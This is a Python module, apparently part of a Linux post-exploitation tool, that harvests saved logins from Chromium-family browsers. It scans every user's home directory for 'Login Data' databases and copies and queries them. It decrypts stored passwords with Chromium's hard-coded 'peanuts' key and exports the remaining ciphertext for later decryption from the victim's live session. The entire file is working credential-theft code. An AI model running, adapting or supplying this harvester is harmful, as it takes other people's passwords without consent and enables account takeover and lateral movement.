"""Chromium-family saved logins (Chrome, Chromium, Brave, Edge, Vivaldi, Opera).
Firefox is handled by the existing apps collector; this fills the Chromium gap.

On Linux the password column in 'Login Data' (SQLite) is AES-128-CBC encrypted.
The AES key is PBKDF2(passphrase, salt="saltysalt", iters=1, dklen=16) where the
passphrase is either:
  - the hard-coded "peanuts" (when the browser ran without a usable keyring,
    i.e. --password-store=basic, common on servers/headless), or
  - a random value stored in the desktop keyring (gnome-keyring / kwallet);
    that value is only readable from inside the user's live desktop session, so
    offline it cannot be derived - we fall back to "peanuts".

So: v10-prefixed blobs decrypt offline with "peanuts" iff the browser used the
basic store. Otherwise the ciphertext is exported to `material` for decryption
later from a live session. Either way the DB path + URL + username are reported.
"""
from __future__ import annotations

import base64
import os
import re
import shutil
import sqlite3
import tempfile
from typing import List

from core.secret import Secret, Status
from core.tools import read_text, home_dirs, user_of_home
from .base import BaseCollector

# profile dirs relative to home that hold a "Login Data" sqlite file
_BROWSER_ROOTS = [
    ".config/google-chrome", ".config/chromium", ".config/BraveSoftware/Brave-Browser",
    ".config/microsoft-edge", ".config/vivaldi", ".config/opera",
    "snap/chromium/common/chromium", "snap/brave/*/.config/BraveSoftware",
    ".var/app/com.google.Chrome/config/google-chrome",      # flatpak
    ".var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser",
]
_LOGIN_DB_NAMES = ("Login Data", "Login Data For Account")

try:
    from Crypto.Cipher import AES          # pycryptodome
    _HAVE_AES = True
except Exception:
    try:
        from Cryptodome.Cipher import AES  # pycryptodomex
        _HAVE_AES = True
    except Exception:
        _HAVE_AES = False

try:
    from hashlib import pbkdf2_hmac
    _HAVE_PBKDF2 = True
except Exception:
    _HAVE_PBKDF2 = False


def _derive_key(passphrase: bytes) -> bytes:
    return pbkdf2_hmac("sha1", passphrase, b"saltysalt", 1, dklen=16)


def _decrypt_v10(blob: bytes, key: bytes):
    """Decrypt a Linux v10/v11 Chromium blob. Returns plaintext str or None."""
    if not (_HAVE_AES and _HAVE_PBKDF2):
        return None
    if not blob or blob[:3] not in (b"v10", b"v11"):
        return None
    try:
        enc = blob[3:]
        iv = b" " * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec = cipher.decrypt(enc)
        if not dec:
            return None
        pad = dec[-1]
        if 1 <= pad <= 16:
            dec = dec[:-pad]
        # v11 (and some v10) prepend a 32-byte SHA256 of the url as a MAC header
        txt = dec.decode("utf-8", "ignore")
        return txt or None
    except Exception:
        return None


def _iter_profiles(base: str):
    """Yield (profile_label, login_db_path) for every profile under a base dir."""
    if not os.path.isdir(base):
        return
    candidates = ["Default"] + [d for d in os.listdir(base)
                                if d.startswith("Profile")]
    # also the base itself (some chromium builds put Login Data directly in base)
    for prof in candidates + ["."]:
        pdir = os.path.join(base, prof)
        for name in _LOGIN_DB_NAMES:
            db = os.path.join(pdir, name)
            if os.path.isfile(db):
                label = os.path.basename(base) + "/" + prof
                yield label, db


class ChromiumCollector(BaseCollector):
    name = "Chromium"
    description = "Chrome/Chromium/Brave/Edge saved logins (Login Data)"

    def collect(self) -> List[Secret]:
        found: List[Secret] = []
        key = _derive_key(b"peanuts")   # offline basic-store key

        for h in home_dirs():
            owner = user_of_home(h)
            for rel in _BROWSER_ROOTS:
                # expand simple globs (snap paths) cheaply
                import glob as _glob
                for base in _glob.glob(os.path.join(h, rel)):
                    for label, db in _iter_profiles(base):
                        found += self._read_db(db, label, owner, key)
        return found

    def _read_db(self, db: str, label: str, owner: str, key: bytes) -> List[Secret]:
        out: List[Secret] = []
        tmp = None
        try:
            # copy the db so a lock on a live profile doesn't block us
            fd, tmp = tempfile.mkstemp(prefix="nixdump-logindata-")
            os.close(fd)
            shutil.copy2(db, tmp)
            con = sqlite3.connect(tmp)
            cur = con.execute(
                "SELECT origin_url, username_value, password_value FROM logins")
            rows = cur.fetchall()
            con.close()
        except Exception as e:
            if tmp and os.path.exists(tmp):
                os.unlink(tmp)
            # DB unreadable - still report the artifact as a pivot pointer
            return [Secret("Chromium", owner, db, Status.INFO, target=db,
                           secret_type="browser-db",
                           notes="Login Data present, unreadable offline: %s" % e)]
        finally:
            if tmp and os.path.exists(tmp):
                try:
                    os.unlink(tmp)
                except Exception:
                    pass

        for url, user, pw_blob in rows:
            if not url and not user:
                continue
            blob = pw_blob if isinstance(pw_blob, (bytes, bytearray)) else b""
            plain = _decrypt_v10(bytes(blob), key)
            if plain:
                out.append(Secret("Chromium", user or "", plain, Status.DECRYPTED,
                                  target=url, secret_type="browser-password",
                                  notes="%s (basic store / peanuts)" % label))
            else:
                # could not decrypt offline (keyring-protected or no crypto libs):
                # export the ciphertext for later decryption from a live session
                b64 = base64.b64encode(bytes(blob)).decode() if blob else ""
                note = ("%s - keyring-protected; decrypt from live session "
                        "(or install pycryptodome if basic store)" % label)
                out.append(Secret("Chromium", user or "", url or db, Status.INFO,
                                  target=url, secret_type="browser-password-enc",
                                  notes=note, material=b64))
        return out
